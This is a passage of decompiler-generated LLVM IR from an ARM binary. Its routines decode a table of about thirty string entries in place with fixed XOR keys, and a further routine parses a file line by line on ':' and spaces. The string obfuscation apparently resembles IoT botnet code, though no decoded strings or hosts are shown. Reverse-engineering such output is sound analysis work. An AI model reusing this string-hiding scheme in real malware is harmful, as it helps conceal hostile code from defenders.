  %v0_83b4 = phi i32 [ %v3_83b4, %dec_label_pc_83b4 ], [ %v2_82d4, %dec_label_pc_82cc ]
  %v1_82e0 = inttoptr i32 %v0_83b4 to i32*
  %v2_82e0 = load i32, i32* %v1_82e0, align 4
  %tmp14 = icmp sgt i32 %v2_82e0, 0
  %v9_82ec = icmp eq i32 %v1_82d8, %v2_82e0
  %or.cond = and i1 %tmp14, %v9_82ec
  br i1 %or.cond, label %dec_label_pc_82f4, label %dec_label_pc_83b4

dec_label_pc_82f4:                                ; preds = %dec_label_pc_82e0
  %v1_82f4 = add i32 %v0_83b4, 10
  %v2_82f4 = inttoptr i32 %v1_82f4 to i8*
  %v3_82f4 = load i8, i8* %v2_82f4, align 1
  %v4_82f4 = zext i8 %v3_82f4 to i32
  %v2_82f8 = icmp eq i8 %v3_82f4, 0
  br i1 %v2_82f8, label %dec_label_pc_8354.preheader, label %.thread

dec_label_pc_8354.preheader:                      ; preds = %dec_label_pc_82f4
  store i32 %v4_82f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8354

.thread:                                          ; preds = %dec_label_pc_82f4
  ret i32 %v1_82d8

dec_label_pc_8308:                                ; preds = %dec_label_pc_8354
  %v1_8308 = add i32 %v0_8308, 4
  %v2_8308 = inttoptr i32 %v1_8308 to i32*
  %v3_8308 = load i32, i32* %v2_8308, align 4
  store i32 %v3_8308, i32* %r1.global-to-local, align 4
  %v2_830c = add i32 %v3_8308, %v2_8318
  %v3_830c = inttoptr i32 %v2_830c to i8*
  %v4_830c = load i8, i8* %v3_830c, align 1
  %v2_8314 = xor i8 %v4_830c, -19
  store i8 %v2_8314, i8* %v3_830c, align 1
  %v0_831c = load i32, i32* %ip.global-to-local, align 4
  %v1_831c = add i32 %v0_831c, 4
  %v2_831c = inttoptr i32 %v1_831c to i32*
  %v3_831c = load i32, i32* %v2_831c, align 4
  store i32 %v3_831c, i32* %r1.global-to-local, align 4
  %v0_8320 = load i32, i32* %r0.global-to-local, align 4
  %v2_8320 = add i32 %v0_8320, %v3_831c
  %v3_8320 = inttoptr i32 %v2_8320 to i8*
  %v4_8320 = load i8, i8* %v3_8320, align 1
  %v2_8328 = xor i8 %v4_8320, -22
  store i8 %v2_8328, i8* %v3_8320, align 1
  %v0_8330 = load i32, i32* %ip.global-to-local, align 4
  %v1_8330 = add i32 %v0_8330, 4
  %v2_8330 = inttoptr i32 %v1_8330 to i32*
  %v3_8330 = load i32, i32* %v2_8330, align 4
  %v0_8334 = load i32, i32* %r0.global-to-local, align 4
  %v2_8334 = add i32 %v0_8334, %v3_8330
  %v3_8334 = inttoptr i32 %v2_8334 to i8*
  %v4_8334 = load i8, i8* %v3_8334, align 1
  %v6_8334 = zext i8 %v4_8334 to i32
  %v1_8338 = load i32, i32* @lr, align 4
  %v2_8338 = xor i32 %v1_8338, %v6_8334
  %v1_833c = trunc i32 %v2_8338 to i8
  store i8 %v1_833c, i8* %v3_8334, align 1
  %v0_8340 = load i32, i32* %ip.global-to-local, align 4
  %v1_8340 = add i32 %v0_8340, 4
  %v2_8340 = inttoptr i32 %v1_8340 to i32*
  %v3_8340 = load i32, i32* %v2_8340, align 4
  %v0_8344 = load i32, i32* %r0.global-to-local, align 4
  %v2_8344 = add i32 %v0_8344, %v3_8340
  %v3_8344 = inttoptr i32 %v2_8344 to i8*
  %v4_8344 = load i8, i8* %v3_8344, align 1
  %v6_8344 = zext i8 %v4_8344 to i32
  %v1_8348 = load i32, i32* @lr, align 4
  %v2_8348 = xor i32 %v1_8348, %v6_8344
  %v1_834c = trunc i32 %v2_8348 to i8
  store i8 %v1_834c, i8* %v3_8344, align 1
  %v0_8350 = load i32, i32* %r0.global-to-local, align 4
  %v1_8350 = add i32 %v0_8350, 1
  store i32 %v1_8350, i32* %r0.global-to-local, align 4
  %v0_8354.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_8354

dec_label_pc_8354:                                ; preds = %dec_label_pc_8354.preheader, %dec_label_pc_8308
  %v2_8318 = phi i32 [ %v4_82f4, %dec_label_pc_8354.preheader ], [ %v1_8350, %dec_label_pc_8308 ]
  %v0_8308 = phi i32 [ %v0_83b4, %dec_label_pc_8354.preheader ], [ %v0_8354.pre, %dec_label_pc_8308 ]
  %v1_8354 = add i32 %v0_8308, 8
  %v2_8354 = inttoptr i32 %v1_8354 to i8*
  %v3_8354 = load i8, i8* %v2_8354, align 1
  %v4_8354 = zext i8 %v3_8354 to i32
  %v1_8358 = add i32 %v0_8308, 9
  %v2_8358 = inttoptr i32 %v1_8358 to i8*
  %v3_8358 = load i8, i8* %v2_8358, align 1
  %v4_8358 = zext i8 %v3_8358 to i32
  %v4_835c = mul nuw nsw i32 %v4_8358, 256
  %v5_835c = or i32 %v4_835c, %v4_8354
  store i32 -34, i32* @lr, align 4
  %v5_8368 = icmp slt i32 %v2_8318, %v5_835c
  br i1 %v5_8368, label %dec_label_pc_8308, label %dec_label_pc_8398

dec_label_pc_8374:                                ; preds = %dec_label_pc_8398
  %v1_8374 = add i32 %v0_8374, 4
  %v2_8374 = inttoptr i32 %v1_8374 to i32*
  %v3_8374 = load i32, i32* %v2_8374, align 4
  %v2_8378 = add i32 %v3_8374, %v2_8384
  %v1_837c = add i32 %v2_8378, 1
  %v2_837c = inttoptr i32 %v1_837c to i8*
  %v3_837c = load i8, i8* %v2_837c, align 1
  %v3_8380 = inttoptr i32 %v2_8378 to i8*
  %v4_8380 = load i8, i8* %v3_8380, align 1
  %v6_8380 = zext i8 %v4_8380 to i32
  store i32 %v6_8380, i32* %r1.global-to-local, align 4
  store i8 %v3_837c, i8* %v3_8380, align 1
  %v0_8388 = load i32, i32* %ip.global-to-local, align 4
  %v1_8388 = add i32 %v0_8388, 4
  %v2_8388 = inttoptr i32 %v1_8388 to i32*
  %v3_8388 = load i32, i32* %v2_8388, align 4
  %v1_838c = load i32, i32* %r0.global-to-local, align 4
  %v2_838c = add i32 %v1_838c, %v3_8388
  %v0_8390 = load i32, i32* %r1.global-to-local, align 4
  %v1_8390 = trunc i32 %v0_8390 to i8
  %v3_8390 = add i32 %v2_838c, 1
  %v4_8390 = inttoptr i32 %v3_8390 to i8*
  store i8 %v1_8390, i8* %v4_8390, align 1
  %v0_8394 = load i32, i32* %r0.global-to-local, align 4
  %v1_8394 = add i32 %v0_8394, 2
  %v0_8398.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_8398

dec_label_pc_8398:                                ; preds = %dec_label_pc_8354, %dec_label_pc_8374
  %v0_8374 = phi i32 [ %v0_8398.pre, %dec_label_pc_8374 ], [ %v0_8308, %dec_label_pc_8354 ]
  %v2_8384 = phi i32 [ %v1_8394, %dec_label_pc_8374 ], [ 0, %dec_label_pc_8354 ]
  store i32 %v2_8384, i32* %r0.global-to-local, align 4
  %v1_8398 = add i32 %v0_8374, 8
  %v2_8398 = inttoptr i32 %v1_8398 to i8*
  %v3_8398 = load i8, i8* %v2_8398, align 1
  %v4_8398 = zext i8 %v3_8398 to i32
  %v1_839c = add i32 %v0_8374, 9
  %v2_839c = inttoptr i32 %v1_839c to i8*
  %v3_839c = load i8, i8* %v2_839c, align 1
  %v4_839c = zext i8 %v3_839c to i32
  %v4_83a0 = mul nuw nsw i32 %v4_839c, 256
  %v5_83a0 = or i32 %v4_83a0, %v4_8398
  %v1_83a4 = add nsw i32 %v5_83a0, -1
  %v5_83ac = icmp slt i32 %v2_8384, %v1_83a4
  br i1 %v5_83ac, label %dec_label_pc_8374, label %dec_label_pc_83c0

dec_label_pc_83b4:                                ; preds = %dec_label_pc_82e0
  %v1_83b4 = add i32 %v0_83b4, 12
  %v2_83b4 = inttoptr i32 %v1_83b4 to i32*
  %v3_83b4 = load i32, i32* %v2_83b4, align 4
  store i32 %v3_83b4, i32* %ip.global-to-local, align 4
  %v2_83b8 = icmp eq i32 %v3_83b4, 0
  br i1 %v2_83b8, label %dec_label_pc_83b8.dec_label_pc_83c0.loopexit1_crit_edge, label %dec_label_pc_82e0

dec_label_pc_83b8.dec_label_pc_83c0.loopexit1_crit_edge: ; preds = %dec_label_pc_83b4
  br label %dec_label_pc_83c0

dec_label_pc_83c0:                                ; preds = %dec_label_pc_8398, %dec_label_pc_82cc, %dec_label_pc_83b8.dec_label_pc_83c0.loopexit1_crit_edge
  %v2_83c4 = phi i32 [ 0, %dec_label_pc_83b8.dec_label_pc_83c0.loopexit1_crit_edge ], [ 0, %dec_label_pc_82cc ], [ %v0_8374, %dec_label_pc_8398 ]
  %v3_83c4 = add i32 %v2_83c4, 10
  %v4_83c4 = inttoptr i32 %v3_83c4 to i8*
  store i8 1, i8* %v4_83c4, align 1
  %v5_83c8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v5_83c8

; uselistorder directives
  uselistorder i32 %v3_83b4, { 1, 2, 0 }
  uselistorder i32 %v2_8384, { 1, 2, 0 }
  uselistorder i32 %v0_8374, { 0, 3, 2, 1 }
  uselistorder i32 %v0_8308, { 0, 3, 2, 1 }
  uselistorder i32 %v2_8318, { 1, 0 }
  uselistorder i32 %v2_82e0, { 1, 0 }
  uselistorder i32 %v0_83b4, { 2, 0, 1, 3 }
  uselistorder i32 %v1_82d8, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 10, 4, 2, 3, 1, 5, 6, 7, 8, 9, 11, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_83c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8398, { 1, 0 }
  uselistorder label %dec_label_pc_8354, { 1, 0 }
  uselistorder label %dec_label_pc_82e0, { 1, 0 }
}

define i32 @function_83d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_83d0:
  %v2_83d4 = load i32, i32* @global_var_1741c.21, align 4
  %v1_83d8 = urem i32 %arg1, 256
  %v2_83f82 = icmp eq i32 %v2_83d4, 0
  br i1 %v2_83f82, label %dec_label_pc_8400, label %dec_label_pc_83e0

dec_label_pc_83e0:                                ; preds = %dec_label_pc_83d0, %dec_label_pc_83f4
  %v0_83f4 = phi i32 [ %v3_83f4, %dec_label_pc_83f4 ], [ %v2_83d4, %dec_label_pc_83d0 ]
  %v1_83e0 = inttoptr i32 %v0_83f4 to i32*
  %v2_83e0 = load i32, i32* %v1_83e0, align 4
  store i32 %v2_83e0, i32* @r2, align 4
  %tmp = icmp sgt i32 %v2_83e0, 0
  %v9_83ec = icmp eq i32 %v1_83d8, %v2_83e0
  %or.cond = and i1 %tmp, %v9_83ec
  br i1 %or.cond, label %dec_label_pc_8404, label %dec_label_pc_83f4

dec_label_pc_83f4:                                ; preds = %dec_label_pc_83e0
  %v1_83f4 = add i32 %v0_83f4, 12
  %v2_83f4 = inttoptr i32 %v1_83f4 to i32*
  %v3_83f4 = load i32, i32* %v2_83f4, align 4
  %v2_83f8 = icmp eq i32 %v3_83f4, 0
  br i1 %v2_83f8, label %dec_label_pc_83f8.dec_label_pc_8400_crit_edge, label %dec_label_pc_83e0

dec_label_pc_83f8.dec_label_pc_8400_crit_edge:    ; preds = %dec_label_pc_83f4
  br label %dec_label_pc_8400

dec_label_pc_8400:                                ; preds = %dec_label_pc_83f8.dec_label_pc_8400_crit_edge, %dec_label_pc_83d0
  ret i32 %v1_83d8

dec_label_pc_8404:                                ; preds = %dec_label_pc_83e0
  %v1_8404 = add i32 %v0_83f4, 4
  %v2_8404 = inttoptr i32 %v1_8404 to i32*
  %v3_8404 = load i32, i32* %v2_8404, align 4
  ret i32 %v3_8404

; uselistorder directives
  uselistorder i32 %v3_83f4, { 1, 0 }
  uselistorder i32 %v2_83e0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_83e0, { 1, 0 }
}

define i32 @function_8410() local_unnamed_addr {
dec_label_pc_8410:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %v1_8418 = call i32 @function_c1f8(i32 16)
  store i32 %v1_8418, i32* @global_var_1741c.21, align 4
  store i32 ptrtoint (i32* @global_var_17420.26 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_842c = add i32 %v1_8418, 12
  %v3_842c = inttoptr i32 %v2_842c to i32*
  store i32 0, i32* %v3_842c, align 4
  %v0_8430 = load i32, i32* %r2.global-to-local, align 4
  %v2_8430 = inttoptr i32 %v1_8418 to i32*
  store i32 %v0_8430, i32* %v2_8430, align 4
  %v1_8434 = load i32, i32* %r3.global-to-local, align 4
  %v2_8434 = inttoptr i32 %v1_8434 to i32*
  store i32 %v1_8418, i32* %v2_8434, align 4
  ret i32 %v1_8418

; uselistorder directives
  uselistorder i32 %v1_8418, { 2, 1, 0, 3, 4 }
}

define i32 @function_8444(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8444:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_8444 = load i32, i32* @r4, align 4
  store i32 %v3_8444, i32* %stack_var_-20, align 4
  %v6_8444 = load i32, i32* @r5, align 4
  %v9_8444 = load i32, i32* @r6, align 4
  %v12_8444 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  %v3_8454 = mul i32 %arg2, 65536
  store i32 %v3_8454, i32* @r5, align 4
  %v1_8458 = call i32 @function_c1f8(i32 16)
  %v0_845c = load i32, i32* @r5, align 4
  %v3_845c = udiv i32 %v0_845c, 65536
  store i32 %v3_845c, i32* @r5, align 4
  store i32 %v1_8458, i32* @r4, align 4
  %v0_8468 = load i32, i32* @r6, align 4
  %v2_8468 = inttoptr i32 %v1_8458 to i32*
  store i32 %v0_8468, i32* %v2_8468, align 4
  %v1_846c = call i32 @function_c1f8(i32 %v3_845c)
  %v0_8470 = load i32, i32* @r7, align 4
  store i32 %v0_8470, i32* %r1.global-to-local, align 4
  %v0_8474 = load i32, i32* @r5, align 4
  store i32 %v0_8474, i32* @r2, align 4
  %v1_8478 = load i32, i32* @r4, align 4
  %v2_8478 = add i32 %v1_8478, 4
  %v3_8478 = inttoptr i32 %v2_8478 to i32*
  store i32 %v1_846c, i32* %v3_8478, align 4
  %v3_847c = call i32 @function_ab58(i32 %v1_846c, i32 %v0_8470, i32 %v0_8474)
  store i32 ptrtoint (i32* @global_var_17420.26 to i32), i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_8488 = load i32, i32* @global_var_17420.26, align 4
  %v0_848c = load i32, i32* @r5, align 4
  %v3_848c = sdiv i32 %v0_848c, 256
  store i32 %v3_848c, i32* %r2.global-to-local, align 4
  %v2_8490 = load i32, i32* @r4, align 4
  %v3_8490 = add i32 %v2_8490, 10
  %v4_8490 = inttoptr i32 %v3_8490 to i8*
  store i8 -1, i8* %v4_8490, align 1
  %v0_8494 = load i32, i32* %r3.global-to-local, align 4
  %v1_8494 = add i32 %v0_8494, 1
  store i32 %v1_8494, i32* %r3.global-to-local, align 4
  %v1_8498 = load i32, i32* @r4, align 4
  %v2_8498 = add i32 %v1_8498, 12
  %v3_8498 = inttoptr i32 %v2_8498 to i32*
  store i32 %v1_8494, i32* %v3_8498, align 4
  %v0_849c = load i32, i32* %r2.global-to-local, align 4
  %v1_849c = trunc i32 %v0_849c to i8
  %v2_849c = load i32, i32* @r4, align 4
  %v3_849c = add i32 %v2_849c, 9
  %v4_849c = inttoptr i32 %v3_849c to i8*
  store i8 %v1_849c, i8* %v4_849c, align 1
  %v0_84a0 = load i32, i32* @r4, align 4
  %v2_84a0 = add i32 %v2_8488, 12
  %v3_84a0 = inttoptr i32 %v2_84a0 to i32*
  store i32 %v0_84a0, i32* %v3_84a0, align 4
  %v0_84a4 = load i32, i32* @r5, align 4
  %v1_84a4 = trunc i32 %v0_84a4 to i8
  %v2_84a4 = load i32, i32* @r4, align 4
  %v3_84a4 = add i32 %v2_84a4, 8
  %v4_84a4 = inttoptr i32 %v3_84a4 to i8*
  store i8 %v1_84a4, i8* %v4_84a4, align 1
  %v0_84a8 = load i32, i32* @r4, align 4
  %v1_84a8 = load i32, i32* %r1.global-to-local, align 4
  %v2_84a8 = inttoptr i32 %v1_84a8 to i32*
  store i32 %v0_84a8, i32* %v2_84a8, align 4
  %v2_84ac = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_84ac, i32* @r4, align 4
  store i32 %v6_8444, i32* @r5, align 4
  store i32 %v9_8444, i32* @r6, align 4
  store i32 %v12_8444, i32* @r7, align 4
  ret i32 %v2_8488

; uselistorder directives
  uselistorder i32 %v3_845c, { 1, 0 }
  uselistorder i32 %v1_8458, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
}

define i32 @function_84b4(i32 %arg1) local_unnamed_addr {
dec_label_pc_84b4:
  %v0_84b8 = call i32 @function_8410()
  %v3_84c8 = call i32 @function_8444(i32 1, i32 21, i32 ptrtoint (i32* @global_var_dff8.29 to i32))
  %v3_84d8 = call i32 @function_8444(i32 2, i32 21, i32 ptrtoint (i32* @global_var_e010.31 to i32))
  %v3_84e8 = call i32 @function_8444(i32 3, i32 7, i32 ptrtoint (i32* @global_var_e028.33 to i32))
  %v3_84f8 = call i32 @function_8444(i32 4, i32 6, i32 ptrtoint (i32* @global_var_e030.35 to i32))
  %v3_8508 = call i32 @function_8444(i32 5, i32 5, i32 ptrtoint (i32* @global_var_e038.37 to i32))
  %v3_8518 = call i32 @function_8444(i32 6, i32 14, i32 ptrtoint (i32* @global_var_e040.39 to i32))
  %v3_8528 = call i32 @function_8444(i32 7, i32 4, i32 ptrtoint (i32* @global_var_e050.41 to i32))
  %v3_8538 = call i32 @function_8444(i32 8, i32 17, i32 ptrtoint (i32* @global_var_e058.43 to i32))
  %v3_8548 = call i32 @function_8444(i32 9, i32 10, i32 ptrtoint (i32* @global_var_e06c.45 to i32))
  %v3_8558 = call i32 @function_8444(i32 10, i32 8, i32 ptrtoint (i32* @global_var_e078.47 to i32))
  %v3_8568 = call i32 @function_8444(i32 11, i32 13, i32 ptrtoint (i32* @global_var_e084.49 to i32))
  %v3_8578 = call i32 @function_8444(i32 12, i32 11, i32 ptrtoint (i32* @global_var_e094.51 to i32))
  %v3_8588 = call i32 @function_8444(i32 13, i32 15, i32 ptrtoint (i32* @global_var_e0a0.53 to i32))
  %v3_8598 = call i32 @function_8444(i32 14, i32 10, i32 ptrtoint (i32* @global_var_e0b0.55 to i32))
  %v3_85a8 = call i32 @function_8444(i32 15, i32 10, i32 ptrtoint (i32* @global_var_e0bc.57 to i32))
  %v3_85b8 = call i32 @function_8444(i32 16, i32 23, i32 ptrtoint (i32* @global_var_e0c8.59 to i32))
  %v3_85c8 = call i32 @function_8444(i32 17, i32 33, i32 ptrtoint (i32* @global_var_e0e0.61 to i32))
  %v3_85d8 = call i32 @function_8444(i32 18, i32 23, i32 ptrtoint (i32* @global_var_e104.63 to i32))
  %v3_85e8 = call i32 @function_8444(i32 19, i32 8, i32 ptrtoint (i32* @global_var_e11c.65 to i32))
  %v3_85f8 = call i32 @function_8444(i32 20, i32 8, i32 ptrtoint (i32* @global_var_e128.67 to i32))
  %v3_8608 = call i32 @function_8444(i32 21, i32 23, i32 ptrtoint (i32* @global_var_e134.69 to i32))
  %v3_8618 = call i32 @function_8444(i32 22, i32 10, i32 ptrtoint (i32* @global_var_e14c.71 to i32))
  %v3_8628 = call i32 @function_8444(i32 25, i32 16, i32 ptrtoint (i32* @global_var_e158.73 to i32))
  %v3_8638 = call i32 @function_8444(i32 26, i32 15, i32 ptrtoint (i32* @global_var_e16c.75 to i32))
  %v3_8648 = call i32 @function_8444(i32 27, i32 16, i32 ptrtoint (i32* @global_var_e17c.77 to i32))
  %v3_8658 = call i32 @function_8444(i32 28, i32 16, i32 ptrtoint (i32* @global_var_e190.79 to i32))
  %v4_8668 = call i32 @function_8444(i32 29, i32 50, i32 ptrtoint ([51 x i8]* @global_var_e1a4.81 to i32))
  %v4_867c = call i32 @function_8444(i32 30, i32 52, i32 ptrtoint ([53 x i8]* @global_var_e1d8.83 to i32))
  ret i32 %v4_867c

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @function_8444, { 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @function_86f0(i32 %arg1) local_unnamed_addr {
dec_label_pc_86f0:
  %v2_86f4 = load i32, i32* @global_var_17424.85, align 4
  %v2_86fc = call i32 @function_b984(i32 %v2_86f4, i32 9)
  %v0_8700 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8700, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_86f0
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_86f0, %bb
  ret i32 %v2_86fc

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_8704(i32 %arg1) local_unnamed_addr {
dec_label_pc_8704:
  %tmp98 = call i8 @__decompiler_undefined_function_1()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-68 = alloca i8, align 1
  %stack_var_-581 = alloca i32, align 4
  %stack_var_-8773 = alloca i32, align 4
  %stack_var_-4677 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_8704 = load i32, i32* @r4, align 4
  store i32 %v3_8704, i32* %stack_var_-36, align 4
  %v6_8704 = load i32, i32* @r5, align 4
  %v9_8704 = load i32, i32* @r6, align 4
  %v12_8704 = load i32, i32* @r7, align 4
  %v15_8704 = load i32, i32* @r8, align 4
  %v18_8704 = load i32, i32* @sb, align 4
  %v21_8704 = load i32, i32* @sl, align 4
  %v24_8704 = load i32, i32* @fp, align 4
  %v3_8710 = mul i32 %arg1, 65536
  store i32 %v3_8710, i32* @r4, align 4
  store i32 4096, i32* @r2, align 4
  %v2_8724 = ptrtoint i32* %stack_var_-4677 to i32
  %v2_8728 = bitcast i32* %stack_var_-4677 to i8*
  %v3_8728 = call i32 @function_be40(i8* %v2_8728, i32 0)
  store i32 4096, i32* @r2, align 4
  %v2_8738 = ptrtoint i32* %stack_var_-8773 to i32
  %v2_873c = bitcast i32* %stack_var_-8773 to i8*
  %v3_873c = call i32 @function_be40(i8* %v2_873c, i32 0)
  store i32 513, i32* @r2, align 4
  %v2_8750 = ptrtoint i32* %stack_var_-581 to i32
  %v0_8754 = load i32, i32* @r4, align 4
  %v3_8754 = udiv i32 %v0_8754, 65536
  %v2_8758 = bitcast i32* %stack_var_-581 to i8*
  %v3_8758 = call i32 @function_be40(i8* %v2_8758, i32 0)
  store i32 16, i32* @r2, align 4
  %v2_8770 = ptrtoint i8* %stack_var_-68 to i32
  store i32 %v2_8770, i32* @r6, align 4
  %v2_8774 = ptrtoint i32* %stack_var_-52 to i32
  %v1_875c = mul nuw nsw i32 %v3_8754, 256
  %v3_8778 = and i32 %v1_875c, 65280
  store i32 %v3_8778, i32* @r5, align 4
  %v2_877c = bitcast i32* %stack_var_-52 to i8*
  %v3_877c = call i32 @function_be40(i8* %v2_877c, i32 0)
  %v0_8788 = load i32, i32* @r5, align 4
  %v1_8788 = load i32, i32* @r4, align 4
  %v4_8788 = udiv i32 %v1_8788, 16777216
  %v5_8788 = or i32 %v4_8788, %v0_8788
  %v3_878c = trunc i32 %v5_8788 to i8
  %v4_878c = call i32 @function_ac84(i8 %v3_878c, i32 16, i32 %v2_8770)
  store i32 %v2_8770, i32* @r0, align 4
  %v0_8794 = call i32 @function_ab0c()
  %v7_8798 = icmp eq i32 %v0_8794, 2
  br i1 %v7_8798, label %dec_label_pc_87a0, label %dec_label_pc_87c8

dec_label_pc_87a0:                                ; preds = %dec_label_pc_8704
  %v4_87a8 = zext i8 %tmp98 to i32
  store i32 %v4_87a8, i32* @r2, align 4
  store i8 48, i8* %stack_var_-68, align 1
  br label %dec_label_pc_87c8

dec_label_pc_87c8:                                ; preds = %dec_label_pc_8704, %dec_label_pc_87a0
  %v1_87cc = call i32 @function_81cc(i32 3)
  %v1_87d4 = call i32 @function_81cc(i32 5)
  %v1_87dc = call i32 @function_81cc(i32 7)
  %v1_87e4 = call i32 @function_81cc(i32 6)
  %v1_87ec = call i32 @function_83d0(i32 6)
  %v2_87f4 = inttoptr i32 %v1_87ec to i8*
  %v3_87f4 = call i32 @function_b9b0(i8* %v2_87f4, i32 0)
  %v7_87f8 = icmp eq i32 %v3_87f4, -1
  store i32 %v3_87f4, i32* @r8, align 4
  br i1 %v7_87f8, label %bb, label %dec_label_pc_899c.preheader

bb:                                               ; preds = %dec_label_pc_87c8
  br label %dec_label_pc_8c6c

dec_label_pc_899c.preheader:                      ; preds = %dec_label_pc_87c8
  %v4_89b047 = call i32 @function_aee8(i8* %v2_8758, i32 512, i32 %v3_87f4)
  %v2_89b449 = icmp eq i32 %v4_89b047, 0
  br i1 %v2_89b449, label %dec_label_pc_89c0, label %.lr.ph50

.lr.ph50:                                         ; preds = %dec_label_pc_899c.preheader
  %v2_8870 = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_8810.preheader

dec_label_pc_880c:                                ; preds = %.lr.ph
  %v1_880c = add i32 %v0_880c, 1
  %v2_881c = add i32 %v1_880c, %v2_8750
  %v3_881c = inttoptr i32 %v2_881c to i8*
  %v4_881c = load i8, i8* %v3_881c, align 1
  %v6_881c = zext i8 %v4_881c to i32
  %v2_8820 = icmp eq i8 %v4_881c, 0
  br i1 %v2_8820, label %dec_label_pc_882c, label %.lr.ph

.lr.ph:                                           ; preds = %dec_label_pc_8810.preheader, %dec_label_pc_880c
  %v0_880c = phi i32 [ %v1_880c, %dec_label_pc_880c ], [ 0, %dec_label_pc_8810.preheader ]
  %v1_8824 = phi i32 [ %v6_881c, %dec_label_pc_880c ], [ %v6_881c36, %dec_label_pc_8810.preheader ]
  %v8_8824 = icmp eq i32 %v1_8824, 58
  br i1 %v8_8824, label %dec_label_pc_882c.thread, label %dec_label_pc_880c

dec_label_pc_882c.thread:                         ; preds = %.lr.ph
  br label %dec_label_pc_8844.preheader

dec_label_pc_882c:                                ; preds = %dec_label_pc_880c, %dec_label_pc_8810.preheader
  %v1_8830 = phi i32 [ 0, %dec_label_pc_8810.preheader ], [ %v1_880c, %dec_label_pc_880c ]
  %v0_882c = phi i32 [ %v6_881c36, %dec_label_pc_8810.preheader ], [ %v6_881c, %dec_label_pc_880c ]
  %v2_882c = icmp eq i32 %v0_882c, 0
  br i1 %v2_882c, label %dec_label_pc_899c.backedge, label %dec_label_pc_8844.preheader

dec_label_pc_8844.preheader:                      ; preds = %dec_label_pc_882c.thread, %dec_label_pc_882c
  %v1_883093 = phi i32 [ %v0_880c, %dec_label_pc_882c.thread ], [ %v1_8830, %dec_label_pc_882c ]
  %v2_8830 = add i32 %v1_883093, 2
  %v3_8834 = add i32 %v2_8830, %v2_8750
  %v1_8844128 = inttoptr i32 %v3_8834 to i8*
  %v2_8844129 = load i8, i8* %v1_8844128, align 1
  %v2_8848131 = icmp eq i8 %v2_8844129, 0
  br i1 %v2_8848131, label %dec_label_pc_885c, label %bb122

dec_label_pc_8840:                                ; preds = %bb122
  %v1_8840 = add i32 %storemerge132, 1
  %v1_8844 = inttoptr i32 %v1_8840 to i8*
  %v2_8844 = load i8, i8* %v1_8844, align 1
  %v2_8848 = icmp eq i8 %v2_8844, 0
  br i1 %v2_8848, label %dec_label_pc_885c, label %bb122

bb122:                                            ; preds = %dec_label_pc_8844.preheader, %dec_label_pc_8840
  %v2_8844133 = phi i8 [ %v2_8844, %dec_label_pc_8840 ], [ %v2_8844129, %dec_label_pc_8844.preheader ]
  %storemerge132 = phi i32 [ %v1_8840, %dec_label_pc_8840 ], [ %v3_8834, %dec_label_pc_8844.preheader ]
  %v8_884c = icmp eq i8 %v2_8844133, 32
  br i1 %v8_884c, label %dec_label_pc_885c, label %dec_label_pc_8840

dec_label_pc_885c:                                ; preds = %bb122, %dec_label_pc_8840, %dec_label_pc_8844.preheader
  %storemerge.lcssa = phi i32 [ %v3_8834, %dec_label_pc_8844.preheader ], [ %v1_8840, %dec_label_pc_8840 ], [ %storemerge132, %bb122 ]
  store i32 0, i32* @r7, align 4
  store i32 %v2_8750, i32* @r6, align 4
  %v2_886c = sub i32 %storemerge.lcssa, %v2_8750
  store i32 %v2_886c, i32* @r5, align 4
  %v2_8874 = add i32 %v2_886c, %v2_8870
  store i32 %v3_8834, i32* @r4, align 4
  %v3_887c = add i32 %v2_8874, -545
  %v4_887c = inttoptr i32 %v3_887c to i8*
  store i8 0, i8* %v4_887c, align 1
  %v0_8880 = load i32, i32* @r4, align 4
  store i32 %v0_8880, i32* @r0, align 4
  %v0_8884 = call i32 @function_ab0c()
  store i32 %v0_8884, i32* @r1, align 4
  %v0_8894 = load i32, i32* @r4, align 4
  %v3_8898 = inttoptr i32 %v0_8894 to i8*
  %v4_8898 = call i32 @function_b448(i8* %v3_8898, i32 %v0_8884, i32 %v2_8770)
  %v7_889c = icmp eq i32 %v4_8898, -1
  br i1 %v7_889c, label %dec_label_pc_899c.backedge, label %dec_label_pc_88a4

dec_label_pc_899c.backedge:                       ; preds = %dec_label_pc_885c, %dec_label_pc_891c, %dec_label_pc_8958, %dec_label_pc_882c
  %v0_89ac = load i32, i32* @r8, align 4
  %v4_89b0 = call i32 @function_aee8(i8* %v2_8758, i32 512, i32 %v0_89ac)
  %v2_89b4 = icmp eq i32 %v4_89b0, 0
